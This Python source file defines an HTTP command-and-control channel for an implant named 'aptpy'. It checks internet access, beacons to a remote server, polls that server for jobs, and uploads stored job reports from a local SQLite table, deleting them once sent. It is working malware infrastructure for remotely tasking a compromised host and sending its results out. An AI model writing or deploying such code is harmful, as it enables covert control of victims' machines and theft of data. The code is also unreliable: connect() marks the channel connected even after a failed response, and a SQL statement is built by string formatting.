import requests
import sqlite3
from abstract import AbstractChannel
from logging import getLogger
from json import dumps
from lib.encrypt import encrypt, decrypt


class HttpChannel(AbstractChannel):
    def __init__(self, client_id, queue_send, queue_recv, debug=False):
        super(HttpChannel, self).__init__(client_id, queue_send, queue_recv, debug)

        self._remote_host = 'http://localhost:8000/'

    def enabled(self):
        response = requests.get('https://www.google.com')

        return response.status_code == 200

    def connect(self):
        getLogger('aptpy').debug("[HTTP] Trying to contact the remote server")

        try:
            data = dumps({'task': 'ping', 'client_id': self.client_id})
            encrypted = encrypt(data)
            cookies = {'XDEBUG_SESSION': 'PHPSTORM'} if self.debug else {}

            response = requests.post(self._remote_host,
                                     json=[encrypted['data'], encrypted['sign']],
                                     cookies=cookies
                                     )

            if response.status_code != 200:
                getLogger('aptpy').debug("[HTTP] We can't connect to the remote server")
                self.connected = False

            getLogger('aptpy').debug("[HTTP] Successfully connected to the remote server")
            self.connected = True

        except requests.ConnectionError:
            getLogger('aptpy').debug("[HTTP] An error occurred while contacting the remote server")
            self.connected = False

    def _send(self):
        getLogger('aptpy').debug("[HTTP] Trying to report completed jobs")

        reports = []
        ids = []

        conn = sqlite3.connect(self.db_file)
        cur = conn.cursor()

        for row in cur.execute("SELECT * FROM out LIMIT 5"):
            ids.append(str(row[0]))
            reports.append(row[1])

        # Nothing to report
        if not reports:
            conn.close()
            return

        try:
            cookies = {'XDEBUG_SESSION': 'PHPSTORM'} if self.debug else {}

            response = requests.post(self._remote_host,
                                     json={'task': 'report_job', 'client_id': self.client_id, 'reports': reports},
                                     cookies=cookies
                                     )

            if response.status_code != 200:
                getLogger('aptpy').debug("[HTTP] We can't connect to the remote server")
                self.connected = False
            else:
                if ids:
                    # Delete sent reports
                    cur.execute("DELETE FROM out WHERE id IN(%s)" % ",".join(ids))
                    conn.commit()

        except requests.ConnectionError:
            getLogger('aptpy').debug("[HTTP] An error occurred while contacting the remote server")
            self.connected = False

        conn.close()

    def receive(self):
        getLogger('aptpy').debug("[HTTP] Trying to get new commands from the remote server")

        try:
            cookies = {'XDEBUG_SESSION': 'PHPSTORM'} if self.debug else {}

            response = requests.post(self._remote_host,
                                     json={'task': 'get_job', 'client_id': self.client_id},
                                     cookies=cookies
                                     )

            if response.status_code != 200:
                getLogger('aptpy').debug("[HTTP] We can't connect to the remote server")
                self.connected = False
                return

            return response.json()

        except requests.ConnectionError:
            getLogger('aptpy').debug("[HTTP] An error occurred while contacting the remote server")
            self.connected = False
